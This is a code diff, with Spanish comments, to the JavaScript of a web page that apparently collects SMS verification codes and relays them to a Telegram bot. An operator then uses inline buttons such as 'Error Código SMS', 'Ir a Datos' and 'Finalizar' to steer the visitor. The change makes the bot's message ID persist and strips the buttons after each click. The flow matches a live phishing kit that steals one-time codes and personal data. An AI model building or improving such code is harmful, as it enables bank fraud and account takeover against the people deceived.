@@ -132,6 +132,7 @@
                 }
             }
 
+            // Función sendToTelegram actualizada para devolver el message_id
             async function sendToTelegram(messageContent, keyboard) {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 const payload = {
@@ -150,13 +151,42 @@
                     if (!response.ok) {
                         const errorText = await response.text();
                         console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                        return false;
+                        return null; // Devolver null en caso de fallo
                     }
+                    const data = await response.json();
                     console.log('Mensaje enviado a Telegram exitosamente.');
-                    return true;
+                    return data.result.message_id; // Devolver el message_id
                 } catch (error) {
                     console.error('Error de red al enviar mensaje a Telegram:', error);
-                    return false;
+                    return null;
+                }
+            }
+
+            // Nueva función para editar el mensaje y borrar los botones
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {} // Objeto vacío para eliminar los botones
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -185,6 +215,10 @@
 
                             const callbackDataFull = latest.callback_query.data;
                             const callbackId = latest.callback_query.id;
+                            const messageId = sessionStorage.getItem('telegramMessageId'); // Obtener el message_id guardado
+
+                            // Llamar a la función para borrar los botones antes de la acción
+                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
 
                             try {
                                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -227,7 +261,6 @@
                 }, 1500);
             }
 
-            // Lógica para el movimiento entre los inputs del código
             inputs.forEach((input, i) => {
                 input.addEventListener("input", (e) => {
                     const value = e.target.value;
@@ -299,14 +332,15 @@
                 const keyboard = {
                     inline_keyboard: [
                         [{ text: "❌ Error Código SMS", callback_data: `error_token_sms:${transactionId}` }],
-                        [{ text: "📋 Ir a Datos 2", callback_data: `pedir_datos_2:${transactionId}` }],
+                        [{ text: "📋 Ir a Datos", callback_data: `pedir_datos_2:${transactionId}` }],
                         [{ text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }]
                     ]
                 };
 
-                const sent = await sendToTelegram(telegramMessage, keyboard);
+                const messageId = await sendToTelegram(telegramMessage, keyboard);
 
-                if (sent) {
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
                     checkTokenVerification();
                 } else {
                     spinnerModal.style.display = 'none';
